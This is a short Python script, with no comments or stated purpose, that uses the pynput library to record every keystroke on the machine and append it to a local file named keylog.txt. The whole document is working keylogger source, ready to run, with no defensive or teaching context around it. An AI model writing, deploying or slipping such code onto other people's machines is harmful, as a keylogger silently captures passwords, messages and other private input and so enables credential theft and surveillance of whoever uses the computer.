from pynput.keyboard import Listener

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f" {key} ")

def main():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
